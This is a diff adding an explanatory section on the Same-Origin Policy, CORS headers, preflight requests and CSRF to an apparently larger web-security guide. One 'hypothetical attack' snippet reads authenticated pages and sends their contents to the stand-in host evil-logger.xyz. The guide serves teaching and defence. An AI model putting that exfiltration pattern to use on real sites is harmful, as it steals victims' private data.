@@ -185,3 +185,150 @@ document.body.appendChild(i);
 ---
 
 
+
+
+## 7. Same-Origin Policy & CORS Explained in Depth
+
+### What is the Same-Origin Policy?
+
+The Same-Origin Policy (SOP) is a critical browser security mechanism that prevents scripts on one origin from accessing resources on a different origin. 
+An origin is defined by the tuple:
+
+* **Scheme** (http, https)
+* **Host** (domain or IP address)
+* **Port** (default 80/443 or specified)
+
+If any of these differ, the origins are not considered the same, and access is restricted.
+
+#### Examples
+
+| URL A                                                            | URL B                                                        | Same Origin? |
+| ---------------------------------------------------------------- | ------------------------------------------------------------ | ------------ |
+| [https://app.example.com](https://app.example.com)               | [https://app.example.com:443](https://app.example.com:443)   | ✅            |
+| [https://app.example.com](https://app.example.com)               | [http://app.example.com](http://app.example.com)             | ❌            |
+| [https://api.example.com](https://api.example.com)               | [https://app.example.com](https://app.example.com)           | ❌            |
+| [https://internal.example.local](https://internal.example.local) | [https://internal.example.com](https://internal.example.com) | ❌            |
+
+### Why SOP Matters
+
+Without SOP, malicious websites could make background requests to intranet apps, banking sites, or cloud APIs, read sensitive responses, and exfiltrate user data without their knowledge.
+
+#### Hypothetical Attack Without SOP
+
+```javascript
+<script>
+  async function exfiltrate(url) {
+    const response = await fetch(url, { credentials: 'include' });
+    const data = await response.text();
+    await fetch("https://evil-logger.xyz/log?d=" + btoa(data));
+  }
+  exfiltrate("https://private-internal.local/admin");
+  exfiltrate("https://email.example.xyz/inbox");
+  exfiltrate("http://192.168.1.1/");
+</script>
+```
+
+Without SOP, responses to these fetch calls could be read and exfiltrated, even if the victim is authenticated via cookies.
+
+---
+
+### Exceptions to SOP: img/script/link Cross-Origin Loads
+
+Certain resources can be loaded across origins by design:
+
+* `<img src="https://cdn.site.com/image.png">`
+* `<script src="https://cdn.site.com/lib.js">`
+* `<link href="https://cdn.site.com/style.css" rel="stylesheet">`
+
+However, these cannot be inspected or modified from JavaScript unless explicitly permitted (e.g. via CORS).
+
+---
+
+### What is CORS (Cross-Origin Resource Sharing)?
+
+CORS is a browser-enforced security standard that allows servers to define rules that permit specific cross-origin interactions.
+
+#### Common CORS Headers
+
+| Header                             | Purpose                                                 |
+| ---------------------------------- | ------------------------------------------------------- |
+| `Access-Control-Allow-Origin`      | Specifies which origins are allowed to read responses   |
+| `Access-Control-Allow-Methods`     | Lists allowed HTTP methods for cross-origin requests    |
+| `Access-Control-Allow-Headers`     | Lists permitted custom headers in cross-origin requests |
+| `Access-Control-Allow-Credentials` | Allows cookies or auth headers if set to true           |
+| `Access-Control-Expose-Headers`    | Specifies which response headers are exposed to JS      |
+| `Access-Control-Max-Age`           | Caches preflight response for defined time              |
+
+### Simple vs. Preflighted Requests
+
+* **Simple Requests** (no preflight): GET, POST (form-encoded), no custom headers
+* **Preflighted Requests**: Everything else — the browser sends an `OPTIONS` request to verify permissions
+
+#### Example: Preflight Workflow for JSON POST
+
+**Step 1: Preflight Request**
+
+```
+OPTIONS /data HTTP/1.1
+Origin: https://frontend.app.local
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: Content-Type
+```
+
+**Step 2: Server Response**
+
+```
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://frontend.app.local
+Access-Control-Allow-Methods: POST
+Access-Control-Allow-Headers: Content-Type
+Access-Control-Allow-Credentials: true
+```
+
+**Step 3: Actual Request**
+
+```javascript
+fetch("https://api.service.local/data", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  credentials: "include",
+  body: JSON.stringify({ message: "hello" })
+});
+```
+
+If the CORS headers were missing or invalid, the browser would block the response from being read — **but not the request from being sent**.
+
+---
+
+### CSRF Risk Despite SOP & CORS
+
+While SOP protects against reading responses, it does **not prevent** cross-origin requests from being made. This allows:
+
+* `<form>`-based CSRF
+* `<img>`-based CSRF beacons
+* `fetch()`-based actions that don't require reading responses
+
+Only anti-CSRF tokens and SameSite cookie flags stop CSRF from succeeding.
+
+---
+
+### Summary Diagram
+
+```
+  [ Browser Context: https://evil.attacker ]
+                  |
+    1. Makes background request with cookies
+                  v
+        https://api.victim.local/update
+                  |
+                  v
+    [ Server receives request + cookies ]
+        X  Response is blocked by SOP
+        ✓  Action may still succeed (CSRF)
+```
+
+---
+
+
